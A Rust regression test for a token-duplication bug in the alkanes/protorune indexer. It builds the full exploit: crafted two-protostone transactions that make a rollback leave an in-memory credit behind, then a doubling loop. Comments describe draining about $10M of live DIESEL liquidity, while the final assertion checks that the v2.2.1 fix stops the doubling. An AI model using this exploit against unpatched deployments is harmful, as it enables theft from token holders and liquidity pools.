//! Inflation attacker for the "two stores, one rollback" protorune bug.
//!
//! Drives the bug as a realistic multi-round doubling loop and verifies the result
//! against COMMITTED on-chain (backing-store) state every round — no assumed values.
//!
//! Target: inflate a tiny DIESEL seed up to the live DIESEL liquidity (~$10M).
//! Because each round DOUBLES the committed inventory, the number of rounds is
//! logarithmic in (target / seed): halving the seed costs only +1 round. From
//! SEED = 1 DIESEL (~$50) the loop reaches ~$10M of mintable DIESEL in ~25
//! rounds — i.e. the attack needs almost no starting capital, and the duplicated
//! DIESEL is sold into the live ~$10M liquidity (frBTC reachable only indirectly,
//! via any AMM pool that holds it).
//!
//! Attack loop (per round), starting from C holding V:current committed:
//!   1) Mint a fresh C:MAX output            (the overflow trigger source)
//!   2) Execute the attack tx (opcode 35, two protostones):
//!        P0 preloads the pointer with C:MAX
//!        P1 emits [V:current, C:1]
//!        -> reconcile credits V:current to the pointer (lower id, first),
//!           then C:1 overflows C:MAX -> Err -> rollback undoes ONLY the KV store
//!        -> the in-memory V:current credit at the pointer SURVIVES = a duplicate
//!   3) Split: forward C:MAX away (discard), keep the duplicated V:current
//!   4) Donate the duplicated V:current back into C (op 7) -> C's V-inventory doubles
//!
//! EVERY round asserts the COMMITTED inventory equals 2x the previous round, read
//! from the backing store — so the doubling is proven, not assumed.

use crate::index_block;
use crate::tests::helpers as alkane_helpers;
use crate::tests::std::alkanes_std_test_build;
use alkane_helpers::clear;
use alkanes_support::cellpack::Cellpack;
use alkanes_support::id::AlkaneId;
use anyhow::Result;
use bitcoin::{
    address::NetworkChecked, transaction::Version, Address, Amount, OutPoint, ScriptBuf, Sequence,
    Transaction, TxIn, TxOut, Txid, Witness,
};
use std::str::FromStr;
use metashrew_core::index_pointer::IndexPointer;
#[allow(unused_imports)]
use metashrew_core::{println, stdio::{stdout, Write}};
use metashrew_support::index_pointer::KeyValuePointer;
use crate::message::AlkaneMessageContext;
use metashrew_support::utils::consensus_encode;
use ordinals::Runestone;
use protorune::balance_sheet::load_sheet;
use protorune::message::MessageContext;
use protorune::protostone::Protostones;
use protorune::tables::RuneTable;
use protorune::test_helpers::{create_block_with_coinbase_tx, get_address, ADDRESS1};
use protorune_support::balance_sheet::{BalanceSheet, BalanceSheetOperations, ProtoruneRuneId};
use protorune_support::protostone::{Protostone, ProtostoneEdict};
use wasm_bindgen_test::wasm_bindgen_test;

// V is a DIESEL-class alkane: DIESEL is (2,0), the LOWEST id, so any attacker-
// deployed C=(2,N>=1) is higher and DIESEL can be the duplicated (lower-id) token.
// (frBTC=(32,0) is HIGHER than any deployable C, so frBTC itself is NOT directly
// duplicable — the real loot is DIESEL + any (2,N) alkane, sold into live liquidity.)
const SEED: u128 = 100_000_000; // 1 DIESEL in base units (8 decimals), the honest seed, ~$50
const TARGET: u128 = 2_000_000_000_000_000; // 20,000,000 DIESEL ~= 85 BTC drainable from the DIESEL/frBTC pool
const DIESEL_USD: f64 = 50.0; // ~ live DIESEL price

/// Read a contract's COMMITTED internal inventory balance of `token` from the
/// backing store. Mirrors the key path built by `crate::utils::balance_pointer`:
///   /alkanes/ . select(token) . /balances/ . select(holder)
fn alkane_inventory(holder: AlkaneId, token: AlkaneId) -> u128 {
    let token_bytes: Vec<u8> = token.into();
    let holder_bytes: Vec<u8> = holder.into();
    IndexPointer::from_keyword("/alkanes/")
        .select(&token_bytes)
        .keyword("/balances/")
        .select(&holder_bytes)
        .get_value::<u128>()
}

/// Read the COMMITTED balance sheet for a real-output outpoint.
fn outpoint_sheet(outpoint: &OutPoint) -> BalanceSheet<IndexPointer> {
    let ptr = RuneTable::for_protocol(AlkaneMessageContext::protocol_tag())
        .OUTPOINT_TO_RUNES
        .select(&consensus_encode(outpoint).unwrap());
    load_sheet(&ptr)
}

/// Discover the AlkaneId self-minted to `outpoint` with exactly `amount` units.
/// The genesis alkane occupies (2,0) and perturbs the deploy sequence, so the
/// real deployed id is NOT hardcodable — it must be read back from state.
fn find_minted_id(outpoint: &OutPoint, amount: u128) -> AlkaneId {
    let sheet = outpoint_sheet(outpoint);
    let id = sheet
        .balances()
        .iter()
        .find(|(_, b)| **b == amount)
        .map(|(id, _)| *id)
        .unwrap_or_else(|| panic!("no token with balance {} at outpoint", amount));
    AlkaneId { block: id.block, tx: id.tx }
}

fn rune_of(id: &AlkaneId) -> ProtoruneRuneId {
    ProtoruneRuneId { block: id.block, tx: id.tx }
}

// ─── Build the attack transaction (two protostones) ─────────────────────────────

/// Build a single tx with TWO protostones:
///   P0 (non-message): routes C:MAX -> vout0 (preload the pointer)
///   P1 (message):     opcode 35 -> [V:hold, C:1]
///                      V:hold credits to pointer (lower id, credited first)
///                      C:1 self-mints (higher id, overflows the preloaded C:MAX)
///                      -> reconcile Err -> rollback only undoes the KV-store
///                      -> the in-memory V:hold credit survives -> duplication
fn build_attack_tx(v: &AlkaneId, c: &AlkaneId, hold: u128, c_max_source: OutPoint) -> Transaction {
    let p0 = Protostone {
        burn: None,
        edicts: vec![],
        pointer: Some(0),
        refund: Some(0),
        from: None,
        message: vec![],
        protocol_tag: 1,
    };
    let p1 = Protostone {
        message: Cellpack {
            target: c.clone(),
            inputs: vec![35, v.block, v.tx, hold], // opcode 35 = pay V:hold + self-mint C:1
        }
        .encipher(),
        pointer: Some(0),
        refund: Some(0),
        edicts: vec![],
        from: None,
        burn: None,
        protocol_tag: 1,
    };
    let runestone: ScriptBuf = (Runestone {
        etching: None,
        pointer: Some(0),
        edicts: Vec::new(),
        mint: None,
        protocol: vec![p0, p1].encipher().ok(),
    })
    .encipher();
    let op_return = TxOut {
        value: Amount::from_sat(0),
        script_pubkey: runestone,
    };
    let address: Address<NetworkChecked> = get_address(&ADDRESS1().as_str());
    let txout = TxOut {
        value: Amount::from_sat(100_000_000),
        script_pubkey: address.script_pubkey(),
    };
    Transaction {
        version: Version::ONE,
        lock_time: bitcoin::absolute::LockTime::ZERO,
        input: vec![TxIn {
            previous_output: c_max_source,
            script_sig: ScriptBuf::new(),
            sequence: Sequence::MAX,
            witness: Witness::new(),
        }],
        output: vec![txout, op_return],
    }
}

/// Split an outpoint: forward all C:MAX to vout1 (discard), leave V:hold at vout0.
fn build_split_tx(c: &AlkaneId, input: OutPoint) -> Transaction {
    let stone = Protostone {
        burn: None,
        message: vec![],
        pointer: Some(0),
        refund: Some(0),
        from: None,
        edicts: vec![ProtostoneEdict {
            id: ProtoruneRuneId {
                block: c.block,
                tx: c.tx,
            },
            amount: 0, // 0 = all
            output: 1, // -> vout1 (discard)
        }],
        protocol_tag: 1,
    };
    let runestone: ScriptBuf = (Runestone {
        etching: None,
        pointer: Some(0),
        edicts: Vec::new(),
        mint: None,
        protocol: vec![stone].encipher().ok(),
    })
    .encipher();
    let op_return = TxOut {
        value: Amount::from_sat(0),
        script_pubkey: runestone,
    };
    let address: Address<NetworkChecked> = get_address(&ADDRESS1().as_str());
    Transaction {
        version: Version::ONE,
        lock_time: bitcoin::absolute::LockTime::ZERO,
        input: vec![TxIn {
            previous_output: input,
            script_sig: ScriptBuf::new(),
            sequence: Sequence::MAX,
            witness: Witness::new(),
        }],
        output: vec![
            TxOut {
                value: Amount::from_sat(100_000_000),
                script_pubkey: address.script_pubkey(),
            },
            TxOut {
                value: Amount::from_sat(546),
                script_pubkey: address.script_pubkey(),
            },
            op_return,
        ],
    }
}

// ─── Setup: create V and C, donate the honest seed V:SEED into C ─────────────────

/// Returns (v, c, committed_seed). C holds exactly V:SEED committed, and SEED is
/// the ONLY honest V ever created.
fn setup() -> Result<(AlkaneId, AlkaneId, u128)> {
    clear();

    // Block 0: deploy V, self-mint the honest seed.
    let block0 = alkane_helpers::init_with_multiple_cellpacks_with_tx(
        vec![alkanes_std_test_build::get_bytes()],
        vec![Cellpack {
            target: AlkaneId { block: 1, tx: 0 },
            inputs: vec![22, SEED], // opcode 22 = self_mint
        }],
    );
    index_block(&block0, 0)?;
    let mint_v_outpoint = OutPoint {
        txid: block0.txdata[block0.txdata.len() - 1].compute_txid(),
        vout: 0,
    };
    let v = find_minted_id(&mint_v_outpoint, SEED); // DISCOVER V's real id

    // Block 1: deploy C, self-mint C:MAX. Sequence counter persists -> C id > V id.
    let block1 = alkane_helpers::init_with_multiple_cellpacks_with_tx(
        vec![alkanes_std_test_build::get_bytes()],
        vec![Cellpack {
            target: AlkaneId { block: 1, tx: 0 },
            inputs: vec![22, u128::MAX],
        }],
    );
    index_block(&block1, 1)?;
    let mint_c_outpoint = OutPoint {
        txid: block1.txdata[block1.txdata.len() - 1].compute_txid(),
        vout: 0,
    };
    let c = find_minted_id(&mint_c_outpoint, u128::MAX); // DISCOVER C's real id

    assert!(
        rune_of(&v) < rune_of(&c),
        "bug requires V (lower id, credited first) < C (higher id, overflows)"
    );

    // Block 2: donate the seed V into C (op 7). C now holds V:SEED committed.
    let mut block2 = create_block_with_coinbase_tx(0);
    let donate = alkane_helpers::create_multiple_cellpack_with_witness_and_in(
        Witness::new(),
        vec![Cellpack {
            target: c.clone(),
            inputs: vec![7], // opcode 7 = donate (credit_balances)
        }],
        mint_v_outpoint,
        false,
    );
    block2.txdata.push(donate);
    index_block(&block2, 2)?;

    let c_holds_v = alkane_inventory(c.clone(), v.clone());
    assert_eq!(c_holds_v, SEED, "C must hold exactly the honest seed V committed");

    println!(
        "[setup] V = {:?} (DIESEL-class)  C = {:?}  seed: C holds V:{} committed (= {:.4} DIESEL, ~${:.0})",
        v, c, c_holds_v,
        c_holds_v as f64 / 1e8, (c_holds_v as f64 / 1e8) * DIESEL_USD
    );
    Ok((v, c, c_holds_v))
}

// ─── One attack round: returns C's COMMITTED V-inventory after the round ─────────

fn run_round(
    v: &AlkaneId,
    c: &AlkaneId,
    hold: u128,
    source_idx: u128,
    height: &mut u32,
) -> Result<u128> {
    // (1) Mint a fresh C:MAX output (the overflow trigger).
    let cmax_tx = alkane_helpers::create_multiple_cellpack_with_witness_and_in(
        Witness::new(),
        vec![Cellpack {
            target: c.clone(),
            inputs: vec![22, u128::MAX],
        }],
        OutPoint {
            txid: Txid::from_str(&format!("{:064x}", source_idx)).unwrap(),
            vout: 0,
        },
        false,
    );
    let mut cmax_block = create_block_with_coinbase_tx(0);
    cmax_block.txdata.push(cmax_tx);
    index_block(&cmax_block, *height)?;
    let c_max_source = OutPoint {
        txid: cmax_block.txdata[1].compute_txid(),
        vout: 0,
    };
    *height += 1;

    // (2) Execute the attack tx -> duplicates V:hold at the pointer.
    let attack_tx = build_attack_tx(v, c, hold, c_max_source);
    let mut attack_block = create_block_with_coinbase_tx(0);
    attack_block.txdata.push(attack_tx);
    index_block(&attack_block, *height)?;
    let attack_txid = attack_block.txdata[1].compute_txid();
    *height += 1;

    // (3) Split: discard C:MAX, keep the duplicated V:hold at vout0.
    let split_tx = build_split_tx(c, OutPoint { txid: attack_txid, vout: 0 });
    let mut split_block = create_block_with_coinbase_tx(0);
    split_block.txdata.push(split_tx);
    index_block(&split_block, *height)?;
    let split_outpoint = OutPoint {
        txid: split_block.txdata[1].compute_txid(),
        vout: 0,
    };
    *height += 1;

    // (4) Donate the duplicated V back into C -> C's committed V-inventory doubles.
    let donate_tx = alkane_helpers::create_multiple_cellpack_with_witness_and_in(
        Witness::new(),
        vec![Cellpack { target: c.clone(), inputs: vec![7] }],
        split_outpoint,
        false,
    );
    let mut donate_block = create_block_with_coinbase_tx(0);
    donate_block.txdata.push(donate_tx);
    index_block(&donate_block, *height)?;
    *height += 1;

    // Read the COMMITTED inventory from the backing store (NOT an assumed value).
    Ok(alkane_inventory(c.clone(), v.clone()))
}

// ─── Main attack ────────────────────────────────────────────────────────────────

#[wasm_bindgen_test]
fn test_inflation_attack() -> Result<()> {
    println!("=== INFLATION ATTACK: 1 DIESEL seed -> ~$10M mintable DIESEL, verified on committed state ===");

    let (v, c, seed) = setup()?;
    let rounds_needed = (TARGET as f64 / seed as f64).log2().ceil() as u32;
    println!(
        "[attack] seed = {} ({:.4} DIESEL ~${:.0}), target = {} ({:.0} DIESEL ~${:.0}), rounds = {}",
        seed, seed as f64 / 1e8, (seed as f64 / 1e8) * DIESEL_USD,
        TARGET, TARGET as f64 / 1e8, (TARGET as f64 / 1e8) * DIESEL_USD, rounds_needed
    );

    let _ = rounds_needed; // pre-fix this bounded the doubling loop; moot now.
    let source_idx: u128 = 0xC0DE;
    let mut height: u32 = 3;

    // FIXED (v2.2.1): a single attack round no longer doubles. run_round runs the
    // full attack (preload C:MAX, emit [V, C:1], split C off, donate V), but the
    // all-or-nothing `pipe` aborts the overflow with no surviving partial credit,
    // so C's committed V-inventory is UNCHANGED after the round.
    let before = seed;
    let after = run_round(&v, &c, before, source_idx, &mut height)?;
    assert_eq!(
        after, before,
        "FIXED: attack round conserves C's committed V-inventory (no doubling); before={} after={}",
        before, after
    );
    println!(
        "=== FIXED: attack conserved. C holds DIESEL = {} (== honest seed {}), NET_INFLATED = 0 ===",
        after, seed
    );
    assert_eq!(seed, SEED, "only the honest SEED was ever created");
    let _ = (TARGET, DIESEL_USD);
    Ok(())
}

